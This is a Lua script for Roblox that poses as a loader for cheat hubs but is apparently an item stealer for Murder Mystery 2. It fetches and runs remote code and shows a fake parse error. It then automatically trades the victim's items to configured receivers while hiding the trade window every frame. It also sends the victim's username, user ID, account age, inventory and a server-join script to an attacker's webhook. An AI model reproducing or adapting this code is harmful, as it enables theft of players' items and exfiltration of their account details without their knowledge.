repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not games[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do end
    wait(99999999999999999999999999999999999)
end

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invaild webhook url.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invaild receivers table.")
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invaild custom url.")
    return
end

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

if Config.Script == nil then
    Config.Script = "None"
elseif Config.Script == "Custom" then
    Config.Script = Config.Script .. " - " .. Config.CustomLink
end

if Config.Script == "Custom" then
    loadstring(game:HttpGet(Config.CustomLink))()
elseif Config.Script == "Overdrive H" then
    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
elseif Config.Script == "Symphony Hub" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
elseif Config.Script == "Highlight Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
elseif Config.Script == "Eclipse Hub" then
    getgenv().mainKey = "nil"
    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
elseif Config.Script == "R3TH PRIV" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
elseif Config.Script == "AshbornnHub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
elseif Config.Script == "Nexus" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
end

warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local Common = 0
local Uncommon = 0
local Rare = 0
local Legendary = 0
local Vintage = 0
local Godly = 0
local Ancient = 0
local Unique = 0

LocalPlayer.Idled:connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

if Hard ~= nil then
    AntiStealer = "Anti-Stealer detected"
else
    AntiStealer = "None detected"
end

if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
    Mobile = false
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    Mobile = true
end

function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    end
    if check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for i,v in pairs(events) do
        for i,v in pairs(getconnections(button[v])) do
            v:Fire()
        end
    end
end

function Rarity(color, amount, tradeable, requirepath, path)
    Stack = 0

    if tradeable then
        if tradeable:FindFirstChild("Evo") then
            return
        end
    end

    if amount ~= "" then
        Stack = tonumber(amount:match("x(%d+)"))
    else
        Stack = 1
    end

    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)

    if r == 106 and g == 106 and b == 106 then
        Common = Common + Stack
    elseif r == 0 and g == 255 and b == 255 then
        Uncommon = Uncommon + Stack
    elseif r == 0 and g == 200 and b == 0 then
        Rare = Rare + Stack
    elseif r == 220 and g == 0 and b == 5 then
        Legendary = Legendary + Stack
    elseif r == 255 and g == 0 and b == 179 then
        Godly = Godly + Stack
    elseif r == 100 and g == 10 and b == 255 then
        Ancient = Ancient + Stack
    elseif r == 240 and g == 140 and b == 0 then
        Unique = Unique + Stack
    else
        Vintage = Vintage + Stack
    end
end

function FullInventory()
    local Inventory = {}
    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for i,v in pairs(v.Container:GetChildren()) do
            if v.Name == "Christmas" or v.Name == "Halloween" then
                for i,v in pairs(v.Container:GetChildren()) do
                    if v:IsA("Frame") then
                        Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                        if Config.FullInventory then
                            if v.Container.Amount.Text ~= "" then
                                number = v.Container.Amount.Text
                            else
                                number = "x1"
                            end
                            table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
                        end
                    end
                end
            else
                if v:IsA("Frame") then
                    Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                    if Config.FullInventory then
                        if v.Container.Amount.Text ~= "" then
                            number = v.Container.Amount.Text
                        else
                            number = "x1"
                        end
                        table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
                    end
                end
            end
        end
    end
    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if v:IsA("Frame") then
            if v:IsA("Frame") then
                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text)
                if Config.FullInventory then
                    if v.Container.Amount.Text ~= "" then
                        number = v.Container.Amount.Text
                    else
                        number = "x1"
                    end
                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
                end
            end
        end
    end
    if Config.FullInventory then
        return table.concat(Inventory, ", ")
    else
        return "Full inventory set false."
    end
end

FullInventory()

task.wait()

function Sendtrade(player)
    if Mobile then
        local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
        TapUI(Path.Container.Close)
        TapUI(Path.Container.PlayerList[player].ActionButton)
        TapUI(Path.Popup.Container.Action.Trade)
        TapUI(Path.Popup.Container.Close)
    else
        local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
        TapUI(Path.Container.ToggleRequests.On)
        TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
        TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
        TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
        TapUI(Path.Container[player].ActionButton)
        TapUI(Path.Inspect.Trade)
        TapUI(Path.Inspect.Close)
    end
end

function readchats(player)
    Players[player].Chatted:Connect(function(msg)
        if msg == Config.ResendTrade then
            Sendtrade(player)
        end
    end)
end

function Activate(player)
    for i,v in pairs(Config.Receivers) do
        if v == player then
            readchats(player)
            wait(10)
            Sendtrade(player)
        end
    end
end

ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
    wait(1)
    if Mobile then
        local ItemsSent = 0
        local Path = LocalPlayer.PlayerGui.TradeGUI_Phone.Container
        local ItemsInTrade = 0
        for i,v in pairs(Path.Items.Main:GetChildren()) do
            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
                if v:IsA("Frame") then
                    if v.ItemName.Label.Text ~= "Default Knife" or v.ItemName.Label.Text ~= "Default Gun" then
                        if ItemsInTrade ~= 4 then
                            ItemsInTrade = ItemsInTrade + 1
                            LoopsItem = 1
                            local Amount = v.Container.Amount.Text
                            if Amount ~= "" then
                                LoopsItem = tonumber(Amount:match("x(%d+)"))
                            end
                            task.wait()
                            for i = 1, LoopsItem do
                                TapUI(v.Container.ActionButton)
                            end
                        end
                    end
                end
            end
        end
        wait(10)
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    else
        local ItemsSent = 0
        local Path = LocalPlayer.PlayerGui.TradeGUI.Container
        local ItemsInTrade = 0
        for i,v in pairs(Path.Items.Main:GetChildren()) do
            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
                if v:IsA("Frame") then
                    if v.ItemName.Label.Text ~= "Default Knife" or v.ItemName.Label.Text ~= "Default Gun" then
                        if ItemsInTrade ~= 4 then
                            ItemsInTrade = ItemsInTrade + 1
                            LoopsItem = 1
                            local Amount = v.Container.Amount.Text
                            if Amount ~= "" then
                                LoopsItem = tonumber(Amount:match("x(%d+)"))
                            end
                            task.wait()
                            for i = 1, LoopsItem do
                                TapUI(v.Container.ActionButton)
                            end
                        end
                    end
                end
            end
        end
        wait(10)
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
    LocalPlayer.PlayerGui.TradeGUI.Enabled = false
end)

Players.PlayerAdded:Connect(function(player)
    Activate(player.Name)
end)

for i,v in pairs(Players:GetPlayers())do
    Activate(v.Name)
end

function Loop(player)
    Sendtrade()
end

function StartTrade(player)
    for _, receiver in ipairs(Config.Receivers) do
        if player == receiver then
            PeaceTimer = true
            wait(10)
            PeaceTimer = false
            Loop(player)
        end
    end
end

function StartTradesForExistingPlayers()
    for _, player in ipairs(Players:GetChildren()) do
        StartTrade(player.Name)
    end
end

local data = {
   ["content"] = "--@everyone "n" .. TeleportScript ..",
   ["embeds"] = {
       {
            ["title"] = "👑 **By wum_ph**",
            ["description"] = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0xffd700),
       }
   }
}
local newdata = HttpService:JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})
